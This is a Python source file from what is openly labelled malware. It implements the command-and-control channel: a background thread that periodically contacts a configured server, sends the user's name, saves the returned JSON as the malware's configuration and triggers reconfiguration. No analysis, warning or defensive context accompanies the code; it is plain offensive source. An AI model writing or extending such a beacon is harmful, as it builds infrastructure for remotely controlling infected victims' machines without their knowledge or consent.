from Configuration import Configuration
from Malware import Malware
from Util import Util
from threading import Thread
from time import sleep
from requests import get
from json import loads, dumps
from shutil import copy



class Communication(Thread):


    def __init__(self, malware:Malware, config:Configuration):
        Thread.__init__(self, name='communication')
        self.__malware = malware
        self.__config = config



    def run(self):
        while True:
            sleep(self.__config.communicationFrequency)
            self.getConfigFromServer()



    def getConfigFromServer(self):
        if self.__config.debug:
            print('Connecting to the server...')
        try:
            response = get(url=self.__config.baseURL, params={'username':self.__config.userName})
            data = response.json()
            print(data)
            if data:
                jsonData = dumps(data, ensure_ascii=False)
                Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                if self.__config.debug:
                    print('Config file has been created!')
                self.__malware.setAttributes()
        except Exception:
            print('COMMUNICATION ERROR!')

